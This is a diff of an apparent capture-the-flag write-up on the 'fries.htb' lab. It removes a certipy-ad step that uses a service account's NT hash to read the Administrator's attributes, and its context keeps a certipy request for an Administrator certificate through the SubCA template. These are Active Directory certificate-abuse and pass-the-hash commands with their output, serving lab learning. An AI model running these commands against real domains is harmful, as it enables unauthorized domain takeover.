@@ -1103,23 +1103,6 @@ So first ill add myself as an officer
 The template is already enabled, so i can skip that step
 
 ```python
-certipy-ad account -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-ip '10.129.244.72' -user 'administrator' read
-Certipy v5.1.0 - by Oliver Lyak (ly4k)
-
-[*] Reading attributes for 'Administrator':
-    cn                                  : Administrator
-    distinguishedName                   : CN=Administrator,CN=Users,DC=fries,DC=htb
-    name                                : Administrator
-    objectSid                           : S-1-5-21-858338346-3861030516-3975240472-500
-    sAMAccountName                      : Administrator
-    userAccountControl                  : 66048
-    whenCreated                         : 2025-05-18T14:59:25+00:00
-    whenChanged                         : 2026-08-19T22:20:14+00:00
-```
-
-Then ill need the domain admins SID 
-
-```python
 certipy-ad req -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-ip '10.129.244.72' -target 'dc01.fries.htb' -ca 'fries-DC01-CA' -template 'SubCA' -upn 'Administrator@fries.htb' -debug 
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
